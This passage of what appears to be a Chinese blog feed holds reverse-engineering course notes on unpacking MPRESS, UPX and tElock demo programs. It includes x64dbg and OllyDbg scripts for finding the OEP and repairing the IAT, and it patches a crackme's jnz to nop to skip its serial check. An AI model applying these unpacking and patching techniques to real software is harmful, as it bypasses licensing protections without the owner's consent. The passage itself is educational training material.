5D 41 5C 5F 5E 5D 5B C3</span><br></pre></td></tr></table></figure><p>执行完<code>jmp</code>后，MPRESS完成了第一次解压。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">000000014000BBCB | 48:83EC 28               | sub rsp,28                              |</span><br><span class="line">000000014000BBCF | 48:0300                  | add rax,qword ptr ds:[rax]              |</span><br><span class="line">000000014000BBD2 | 0AC0                     | or al,al                                |</span><br><span class="line">000000014000BBD4 | 0F85 85000000            | jne demo.14000BC5F                      |</span><br><span class="line">000000014000BBDA | 48:2D 00100000           | sub rax,1000                            |</span><br></pre></td></tr></table></figure><p>继续单步，到下面这一步跑飞，重载，再次运行到这里时F7进去这个call指令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">000000014000BBFB | E8 09000000              | call demo.14000BC09                     |;进去</span><br></pre></td></tr></table></figure><p>再次跑飞，再进去单步</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">000000014000BC14 | E8 0F000000              | call demo.14000BC28                     |;进去</span><br></pre></td></tr></table></figure><p>运行到此处，这几条pop与开头几条push对应，并且<code>jmp</code>是个大跳转。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">000000014000BCD5 | 41:58                    | pop r8                                  |</span><br><span class="line">000000014000BCD7 | 5A                       | pop rdx                                 |</span><br><span class="line">000000014000BCD8 | 59                       | pop rcx                                 |</span><br><span class="line">000000014000BCD9 | 5B                       | pop rbx                                 |</span><br><span class="line">000000014000BCDA | 5E                       | pop rsi                                 |</span><br><span class="line">000000014000BCDB | 5F                       | pop rdi                                 |</span><br><span class="line">000000014000BCDC | E9 4F54FFFF              | jmp demo.140001130                      |</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">41 58 5A 59 5B 5E 5F</span><br></pre></td></tr></table></figure><p>执行这个跳转，这里就是64位的VS2013编译出来的OEP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0000000140001130 | 48:83EC 28               | sub rsp,28                              | OEP</span><br><span class="line">0000000140001134 | E8 7B180000              | call demo.1400029B4                     |</span><br><span class="line">0000000140001139 | 48:83C4 28               | add rsp,28                              |</span><br><span class="line">000000014000113D | E9 02000000              | jmp demo.140001144                      |</span><br><span class="line">0000000140001142 | CC                       | int3                                    |</span><br><span class="line">0000000140001143 | CC                       | int3                                    |</span><br></pre></td></tr></table></figure><p>用Scylla将程序dump再fix dump，完成脱壳。</p><p>用脚本找OEP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">erun</span><br><span class="line">find rip,&quot;415F415E415D415C5F5E5D5BC3&quot;//搜索二进制</span><br><span class="line">mov first_jmp,$result//first_jmp=41(first_jmp指向pop r15那一行)</span><br><span class="line">add first_jmp,D//first_jmp=first_jmp+D=E9(加上0xD个偏移到达jmp)</span><br><span class="line">bp first_jmp//在jmp下断</span><br><span class="line">erun//运行</span><br><span class="line">bc//取消断点</span><br><span class="line">sti//F8</span><br><span class="line">find rip,&quot;41585A595B5E5F&quot;</span><br><span class="line">mov second_jmp,$result</span><br><span class="line">add second_jmp,7</span><br><span class="line">bp second_jmp</span><br><span class="line">erun</span><br><span class="line">bc</span><br><span class="line">sti//OEP</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>在脚本窗口中，右键-&gt;载入脚本，按空格直接运行脚本。</p><p>很简单的一个破解，搜索字符串改个跳转即可，右键-&gt;补丁-&gt;修补文件，后缀名自己加上。</p><p>如果是追码也很简单</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">000000014000104C | FF15 CEB10000            | call qword ptr ds:[&lt;&amp;GetDlgItemTextA&gt;]  |</span><br><span class="line">0000000140001052 | 48:8D15 C7470100         | lea rdx,qword ptr ds:[140015820]        |</span><br><span class="line">0000000140001059 | 48:8D0D 88020100         | lea rcx,qword ptr ds:[1400112E8]        | 00000001400112E8:&quot;Fuck L4Nce&quot;</span><br><span class="line">0000000140001060 | E8 9B040000              | call demo_dump_scy.140001500            |</span><br><span class="line">0000000140001065 | 48:8BCB                  | mov rcx,rbx                             |</span><br><span class="line">0000000140001068 | 85C0                     | test eax,eax                            |</span><br><span class="line">000000014000106A | 75 13                    | jne demo_dump_scy.14000107F             |</span><br><span class="line">000000014000106C | 45:33C9                  | xor r9d,r9d                             |</span><br><span class="line">000000014000106F | 4C:8D05 7E020100         | lea r8,qword ptr ds:[1400112F4]         | r8:&amp;&quot;吚x\n€|$@&quot;, 00000001400112F4:&quot;Boom!&quot;</span><br><span class="line">0000000140001076 | 48:8D15 83020100         | lea rdx,qword ptr ds:[140011300]        | 0000000140011300:&quot;Congratulations! You have successfully fucked L4Nce&quot;</span><br><span class="line">000000014000107D | EB 14                    | jmp demo_dump_scy.140001093             |</span><br><span class="line">000000014000107F | 41:B9 10000000           | mov r9d,10                              |</span><br><span class="line">0000000140001085 | 4C:8D05 AC020100         | lea r8,qword ptr ds:[140011338]         | r8:&amp;&quot;吚x\n€|$@&quot;, 0000000140011338:&quot;Boomshakalaka&quot;</span><br><span class="line">000000014000108C | 48:8D15 B5020100         | lea rdx,qword ptr ds:[140011348]        | 0000000140011348:&quot;You Failed!&quot;</span><br></pre></td></tr></table></figure><p>在<code>GetDlgItemTextA</code>函数下断，这个是获取我们输入的字符串。两次F9运行至主程序，输入假码提交，停在断点处。接下来单步</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">000000014000104C | FF15 CEB10000            | call qword ptr ds:[&lt;&amp;GetDlgItemTextA&gt;]  |</span><br><span class="line">0000000140001052 | 48:8D15 C7470100         | lea rdx,qword ptr ds:[140015820]        | rdx:&quot;hhhhhhh&quot;, 0000000140015820:&quot;hhhhhhh&quot;</span><br><span class="line">0000000140001059 | 48:8D0D 88020100         | lea rcx,qword ptr ds:[1400112E8]        | rcx:&quot;Fuck L4Nce&quot;, 00000001400112E8:&quot;Fuck L4Nce&quot;</span><br><span class="line">0000000140001060 | E8 9B040000              | call demo_dump_scy.140001500            |</span><br><span class="line">0000000140001065 | 48:8BCB                  | mov rcx,rbx                             | rcx:&quot;Fuck L4Nce&quot;</span><br><span class="line">0000000140001068 | 85C0                     | test eax,eax                            |</span><br><span class="line">000000014000106A | 75 13                    | jne demo_dump_scy.14000107F             |</span><br><span class="line">000000014000106C | 45:33C9                  | xor r9d,r9d                             |</span><br><span class="line">000000014000106F | 4C:8D05 7E020100         | lea r8,qword ptr ds:[1400112F4]         | 00000001400112F4:&quot;Boom!&quot;</span><br><span class="line">0000000140001076 | 48:8D15 83020100         | lea rdx,qword ptr ds:[140011300]        | rdx:&quot;hhhhhhh&quot;, 0000000140011300:&quot;Congratulations! You have successfully fucked L4Nce&quot;</span><br></pre></td></tr></table></figure><p>很明显就是我们输入的字符串与<code>Fuck L4Nce</code>比较。</p><p>如果想在64位下做补丁工具，推荐用IDA。将脱完壳的程序载入IDA，在Options-&gt;General勾选地址前缀和填上要显示的字节个数。</p><img src="/posts/efe98763/%E5%9C%B0%E5%9D%80.png" class="" title="地址和字节"><p>在汇编窗口找到成功与失败的分岔路。</p><img src="/posts/efe98763/jnz.png" class="" title="分岔路"><p>选中<code>jnz</code>指令，在界面上Edit-&gt;Patch program-&gt;Assemble，将jnz改为nop，由于jnz有两个字节，所以要连续修改两个nop。或者Edit-&gt;Patch program-&gt;Change word，写入0x9090。</p><img src="/posts/efe98763/nop.png" class="" title="nop掉"><p>现在可以看到，上面那块与左边那块合并了，而右边那块被独立出来，没有箭头指向右边那块了。</p><p>然后Edit-&gt;Patch program-&gt;Apply patches to input file，输出窗口提示应用成功。</p><img src="/posts/efe98763/%E8%BE%93%E5%87%BA%E7%AA%97%E5%8F%A3.png" class="" title="输出窗口"><p>课后作业几乎与课程例子一模一样，所以不记笔记了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;由于吾爱虚拟机是32位的，运行不了64位程序，所以这节课用物理机来操作。&lt;/p&gt;
&lt;h1 id=&quot;1-课程例子&quot;&gt;&lt;a href=&quot;#1-课程例子&quot; class=&quot;headerlink&quot; title=&quot;1. 课程例子&quot;&gt;&lt;/a&gt;1. 课程例子&lt;/h1&gt;&lt;p&gt;拿到程序，先运行一下熟悉流程，再查壳，发现有MPRESS壳(压缩壳)。压缩壳在壳段开始的时候做的第一件事往往是&lt;code&gt;pushad&lt;/code&gt;(保存寄存器)，在壳段结束的时候做的最后一件事是&lt;code&gt;popad&lt;/code&gt;(还原寄存器)，所以我们可以用ESP定律脱压缩壳。但在64位的程序下，一般不会这么做。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
    <category term="x64dbg" scheme="http://example.com/tags/x64dbg/"/>
    
    <category term="IDA" scheme="http://example.com/tags/IDA/"/>
    
    <category term="吾爱破解培训" scheme="http://example.com/tags/%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E5%9F%B9%E8%AE%AD/"/>
    
  </entry>
  
  <entry>
    <title>第八九课——深入浅出探讨脱壳细节</title>
    <link href="http://example.com/posts/4b9d65e0.html"/>
    <id>http://example.com/posts/4b9d65e0.html</id>
    <published>2022-04-05T01:29:28.142Z</published>
    <updated>2022-04-11T05:25:50.176Z</updated>
    
    <content type="html"><![CDATA[<p>在做第五六课的打补丁作业时，遇到了在不脱壳的情况下修改程序。在复制到可执行文件时提示“无法定位数据”。这是因为程序加壳后，代码段显示全是空代码，我们修改代码时，系统执行将某代码1修改为某代码2，但系统在代码段找不到某代码1，所以提示“无法定位数据”。</p><p>但如果我们将程序脱壳了，就可在程序上随意修改，所以脱壳的重要性就体现出来了。脱壳毁一生，破解穷三代(bushi)。</p><span id="more"></span><p><strong>脱壳细节</strong></p><ol><li>找OEP(只是万里长征的第一步)</li><li>dump</li></ol><ul><li>无法读取进程内存:换工具(Scylla不错)</li></ul><ol><li>修复IAT</li></ol><ul><li>在此OEP入口没有找到任何有用信息:在你使用的工具选项中取消勾选使用来自磁盘的PE文件,还是不行换工具(Scylla)</li><li>无效函数<ul><li>剪切指针</li><li>跟踪级别1</li><li>跟踪级别3</li><li>插件跟踪</li><li>手动查找输入表(在OD中找)</li><li>OD脚本</li></ul></li></ul><p>程序的加载过程：程序被加载进内存里-&gt;系统根据程序的导入表，填充程序所需的API函数到程序的内存里(IAT：导入地址表)。</p><p>壳：程序的导入表是静态可见的，包含了导入的DLL名称和其导入函数(用exeinfo可看)，有些壳会在加壳的时候把导入表结构取出，然后自行加密，或改变结构。这时系统找不到导入表，也就无法给程序填充所需的API函数地址。加过壳的程序一定是可以运行的，所以很明显这个填充过程被取代了，这个过程会在壳段完成。如果脱壳时直接dump，程序的导入表也就不在了，IAT所填充的函数地址是当前系统的地址，所以这个程序可能只能在脱壳的机器上运行。为了解决这个问题，import REC导入IAT地址值生成一份导入表，然后让程序使用新的导入表，程序可跨系统，在各个机器上与运行。但有些加密壳会使import REC失效，导致导入表无法修复。</p><p>如何使import REC失效：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">本来的函数调用</span><br><span class="line">call addr_api</span><br><span class="line"></span><br><span class="line">某些壳会修改代码</span><br><span class="line">call packspace(packspace:junkcode/无效操作/vm)</span><br><span class="line">jmp addr_api</span><br></pre></td></tr></table></figure><p>也就是间接调用API函数，使工具无法修复导入表。</p><p>如何使import REC失效变为有效，将间接调用修改为直接调用，API有很多，所以不可能人工一个个API函数修改，而是用OD脚本。</p><h1 id="1-熟悉OD脚本工具的使用"><a href="#1-熟悉OD脚本工具的使用" class="headerlink" title="1. 熟悉OD脚本工具的使用"></a>1. 熟悉OD脚本工具的使用</h1><p>在反汇编窗口右键-&gt;Script Functions-&gt;脚本运行窗口(或插件-&gt;ODbgScript-&gt;脚本运行窗口)打开脚本运行窗口。</p><p>（1）右键-&gt;载入脚本，将写好的脚本打开调试脚本。</p><p>（2）右键-&gt;运行脚本，将写好的脚本打开直接运行，不调试。</p><p>编写OD脚本的工具：</p><p>脚本的指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sti ;F7</span><br><span class="line">sto;F8</span><br><span class="line">bp 地址   ;F2</span><br><span class="line">run;F9</span><br><span class="line">esto;Shift+F9</span><br><span class="line">gmi eip,CODEBASE;获取代码段地址</span><br></pre></td></tr></table></figure><p>简单写一个脚本尝试一下，脚本通常为.txt和.osc格式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sti</span><br><span class="line">sti</span><br><span class="line">sti</span><br></pre></td></tr></table></figure><p>载入脚本后，会自动运行脚本的第1行，按Tab键执行脚本的下一行，按空格键直接运行脚本。</p><img src="/posts/4b9d65e0/%E8%BD%BD%E5%85%A5%E8%84%9A%E6%9C%AC.png" class="" title="载入脚本"><h1 id="2-UPX的大表哥"><a href="#2-UPX的大表哥" class="headerlink" title="2. UPX的大表哥"></a>2. UPX的大表哥</h1><p>用普通的方法(单步跟踪、ESP定律、两次内存镜像等)就能找到OEP，关键在于修复IAT。</p><ol><li><p>用importREC获取输入表，发现全都是无效函数，用跟踪级别1就可全部修复完。</p></li><li><p>编写OD脚本(这节课的重点)，OD脚本是基于汇编语言编写的。</p></li></ol><p>因为这个是UPX壳，有一个大跳转跳到OEP处。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00457765  - E9 4266FCFF     jmp upx的大?0041DDAC</span><br></pre></td></tr></table></figure><p>编写到OEP的脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bp 00457765;在jmp下断点</span><br><span class="line">run;F9运行至断点处</span><br><span class="line">sti;F7步入</span><br><span class="line">MSG &quot;OEP到了&quot;   ;弹窗提示OEP到了</span><br><span class="line">ret;退出脚本</span><br></pre></td></tr></table></figure><p>直接运行脚本</p><img src="/posts/4b9d65e0/%E8%84%9A%E6%9C%AC%E5%BC%B9%E7%AA%97.png" class="" title="脚本弹窗"><img src="/posts/4b9d65e0/%E8%84%9A%E6%9C%AC%E7%BB%93%E6%9D%9F.png" class="" title="脚本结束"><p>但这个脚本仅限于当前程序且无重定位(如果当前程序有重定位，取消它的重定位即可)。相对来说，ESP定律的脚本更通用。</p><p>ESP定律是利用堆栈平衡找OEP的手段，首先要执行一条压栈指令来改变栈。等以后再次读取这个栈内容的时候，就说明有栈平衡的迹象，很有可能是栈的恢复。一般来说，压缩壳只有一次恢复，然后就到OEP了，利用这个特性来找OEP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sti;执行pushad</span><br><span class="line">bphws esp,&quot;r&quot;;给esp下硬件断点</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>执行完3行脚本后运行到<code>00457758</code>。还没到达OEP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00457758    8D4424 80       lea eax,dword ptr ss:[esp-0x80]</span><br><span class="line">0045775C    6A 00           push 0x0</span><br><span class="line">0045775E    39C4            cmp esp,eax</span><br><span class="line">00457760  ^ 75 FA           jnz short upx的大?0045775C</span><br><span class="line">00457762    83EC 80         sub esp,-0x80</span><br><span class="line">00457765  - E9 4266FCFF     jmp upx的大?0041DDAC</span><br></pre></td></tr></table></figure><p>再改进一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sti;执行pushad</span><br><span class="line">bphws esp,&quot;r&quot;;给esp下硬件断点</span><br><span class="line">run</span><br><span class="line">sti</span><br><span class="line">sti</span><br><span class="line">sti;到了jnz</span><br><span class="line">bp eip</span><br><span class="line">@LOOP:</span><br><span class="line">run</span><br><span class="line">cmp esp,eax</span><br><span class="line">jnz @LOOP</span><br><span class="line">sti</span><br><span class="line">sti</span><br><span class="line">sti;到OEP</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>UPX的壳段代码是差不多的，这个脚本可以用来找这个UPX版本所有加壳程序的OEP，而且允许程序有重定位。</p><p>到OEP的下一步是找IAT，除了一些特别变态的加密壳比如：Themida，SE，VMProtect，都可以找指令为<code>call dword...</code>(FF 15)，<code>jmp dword...</code>(FF 25)来找IAT。</p><img src="/posts/4b9d65e0/%E6%89%BEIAT.png" class="" title="找IAT"><p>发现注释是空的，在反汇编窗口的那条指令跟进去，<code>push API函数地址</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00401077    FF15 28204300   call dword ptr ds:[0x432028]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0096033C    68 88401877     push comctl32.InitCommonControlsEx</span><br><span class="line">00960341    C3              retn</span><br></pre></td></tr></table></figure><p>这两条指令相当于<code>jmp InitCommonControlsEx</code>。很明显，把API函数调用改成自己的函数，然后在自己的函数里跳到真实的API地址。</p><p>一般来说，间接调用API函数有两种方法：</p><ul><li>在指令二进制，直接带有地址(push)</li><li>根据当前的eip加上指令中的偏移算出地址(jmp)</li></ul><p>虽然它注释是空的，但可以知道IAT的起始位置前面全是空数据，IAT结束时是与用户函数分隔。可以推测IAT起始地址为<code>432000</code>，结束地址为<code>432554</code>。</p><p>继续改进脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">mov iat_b,00432000</span><br><span class="line">mov iat_e,00432554</span><br><span class="line">sti;执行pushad</span><br><span class="line">bphws esp,&quot;r&quot;;给esp下硬件断点</span><br><span class="line">run</span><br><span class="line">sti</span><br><span class="line">sti</span><br><span class="line">sti;到了jnz</span><br><span class="line">bp eip</span><br><span class="line">@LOOP:</span><br><span class="line">run</span><br><span class="line">cmp esp,eax</span><br><span class="line">jnz @LOOP</span><br><span class="line">sti</span><br><span class="line">sti</span><br><span class="line">sti;到OEP</span><br><span class="line">@IAT_LOOP:</span><br><span class="line">mov iat,[iat_b];比如iat=[432000]</span><br><span class="line">cmp iat,0;修改不了空数据，所以要跳过</span><br><span class="line">je @NEXT_LOOP</span><br><span class="line">mov api,[iat+1];比如api=[[432000]+1]=[68 88401877+1]=88401877</span><br><span class="line">mov [iat_b],api;重建iat</span><br><span class="line">@NEXT_LOOP:</span><br><span class="line">add iat_b,4</span><br><span class="line">cmp iat_b,iat_e</span><br><span class="line">jne @IAT_LOOP</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>运行完脚本再dump下来完成脱壳。</p><p>如果修改一个就不用脚本这么麻烦，双击下面这条指令复制API函数地址，去到对应的数据窗口地址修改其数值，右键-&gt;修改，粘贴API函数地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0096033C    68 88401877     push comctl32.InitCommonControlsEx</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00432028  0096033C</span><br><span class="line">修改为</span><br><span class="line">00432028  77184088  comctl32.InitCommonControlsEx</span><br></pre></td></tr></table></figure><p>此时就可看到API函数了。</p><h1 id="3-真假难辨"><a href="#3-真假难辨" class="headerlink" title="3. 真假难辨"></a>3. 真假难辨</h1><p>用单步跟踪、两次内存镜像等都能找到OEP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00446021  /.  55            push ebp                                 ;  OEP</span><br><span class="line">00446022  |.  8BEC          mov ebp,esp</span><br><span class="line">00446024  |.  6A FF         push -0x1</span><br><span class="line">00446026  |.  68 70C04600   push 真假难辩.0046C070</span><br><span class="line">0044602B  |.  68 5CA84400   push 真假难辩.0044A85C                       ;  SE 处理程序安装</span><br><span class="line">00446030  |.  64:A1 0000000&gt;mov eax,dword ptr fs:[0]</span><br></pre></td></tr></table></figure><p>不会找IAT啊…不会写OD脚本…</p><h1 id="4-课后作业"><a href="#4-课后作业" class="headerlink" title="4. 课后作业"></a>4. 课后作业</h1><p>查壳是telock的壳，用最后一次异常法到达OEP，不会去第一课找telock壳详解。也可以三次内存镜像<code>.text</code>-&gt;<code>.rdata</code>-&gt;<code>.text</code>直达OEP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0045D4F6    55              push ebp</span><br><span class="line">0045D4F7    8BEC            mov ebp,esp</span><br><span class="line">0045D4F9    6A FF           push -0x1</span><br><span class="line">0045D4FB    68 28704800     push 第八九课.00487028</span><br><span class="line">0045D500    68 D4024600     push 第八九课.004602D4</span><br></pre></td></tr></table></figure><p>方法一：重建IAT用插件跟踪，剩余4无效指针，直接剪切。程序正常运行。</p><p>方法二：用OD脚本修复IAT，起始位置为<code>47D000</code>，结束位置为<code>47D6A0</code>。</p><p>下面这个脚本很容易看得懂</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">;到达OEP才能用这个脚本</span><br><span class="line">mov iat_s, 0047d024</span><br><span class="line">mov iat_e, 0047d16c</span><br><span class="line">@LOOP1:</span><br><span class="line">mov iat,iat_s+663CFE</span><br><span class="line">mov [iat_s],[iat]</span><br><span class="line">add iat_s,4</span><br><span class="line">cmp iat_s,iat_e</span><br><span class="line">jne @LOOP1</span><br><span class="line"> </span><br><span class="line">mov iat_s,0047d16c</span><br><span class="line">mov iat_e,0047D374</span><br><span class="line">@LOOP2:</span><br><span class="line">mov iat,iat_s+644310</span><br><span class="line">mov [iat_s],[iat]</span><br><span class="line">add iat_s,4</span><br><span class="line">cmp iat_s,iat_e</span><br><span class="line">jne @LOOP2</span><br><span class="line"> </span><br><span class="line">mov iat_s,0047D384</span><br><span class="line">mov iat_e,0047D390</span><br><span class="line">@LOOP3:</span><br><span class="line">mov iat,iat_s+6A2CCE</span><br><span class="line">mov [iat_s],[iat]</span><br><span class="line">add iat_s,4</span><br><span class="line">cmp iat_s,iat_e</span><br><span class="line">jne @LOOP3</span><br><span class="line"> </span><br><span class="line">mov iat_s,0047D390</span><br><span class="line">mov iat_e,0047D600</span><br><span class="line">@LOOP4:</span><br><span class="line">mov iat,iat_s+654543</span><br><span class="line">mov [iat_s],[iat]</span><br><span class="line">add iat_s,4</span><br><span class="line">cmp iat_s,iat_e</span><br><span class="line">jne @LOOP4</span><br><span class="line"></span><br><span class="line">MSG &quot;IAT修复完成！&quot;</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>拿@LOOP1来说，<code>0047d024</code>的数值为<code>00AE0000</code>，Alt+M进入找地址为<code>00AE0000</code>的数据段，开头是一大段杂乱的数据，后面是空数据，紧接着又一段有规律的数据，再接着空数据。这段有规律的数据都是以<code>77</code>开头的，猜测是dll领空的API函数地址。 而<code>0047d024</code>与<code>00AE0D22</code>相差<code>663CFE</code>，所以要加上偏移<code>663CFE</code>即可得到API函数地址。@LOOP2到@LOOP4都同理。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">00AE0D20   00 00 C0 6D F0 77 56 D2 EF 77 1D AF EF 77 FF 82  ..續饂V绎ww</span><br><span class="line">00AE0D30   EF 77 17 6D F2 77 F1 7C EF 77 74 78 EF 77 D9 B4  飛m騱駖飛tx飛俅</span><br><span class="line">00AE0D40   EF 77 71 5A EF 77 6D E4 EF 77 EF 61 EF 77 E0 5F  飛qZ飛m滹w颽飛郷</span><br><span class="line">00AE0D50   EF 77 70 5B EF 77 79 6F EF 77 3D 99 EF 77 BE 99  飛p[飛yo飛=欙w緳</span><br><span class="line">00AE0D60   EF 77 18 89 EF 77 1A E8 EF 77 A0 C7 F1 77 BB 9D  飛夛w栾w犌駑粷</span><br><span class="line">00AE0D70   EF 77 86 77 EF 77 77 DE EF 77 0F 84 EF 77 78 ED  飛唚飛w揎w勶wx</span><br><span class="line">00AE0D80   EF 77 A5 61 EF 77 C1 61 EF 77 2A EB EF 77 D1 86  飛飛羇飛*腼w褑</span><br><span class="line">00AE0D90   EF 77 41 9D EF 77 EE BB EF 77 F3 D7 EF 77 83 9A  飛A濓w罨飛笞飛儦</span><br><span class="line">00AE0DA0   EF 77 15 90 EF 77 B8 D9 F1 77 3A 71 F0 77 3D 8D  飛愶w纲駑:q饂=</span><br><span class="line">00AE0DB0   EF 77 0A 70 EF 77 31 DB F0 77 6E F3 F0 77 D2 34  飛.p飛1垧wn箴w?</span><br><span class="line">00AE0DC0   F0 77 5A 3F F2 77 5E EA EF 77 84 8E EF 77 65 34  饂Z?騱^觑w剮飛e4</span><br><span class="line">00AE0DD0   F0 77 D8 8E EF 77 C1 DD F0 77 60 BE EF 77 F2 4E  饂貛飛凛饂`撅w騈</span><br><span class="line">00AE0DE0   F2 77 38 67 F2 77 D8 D3 F0 77 58 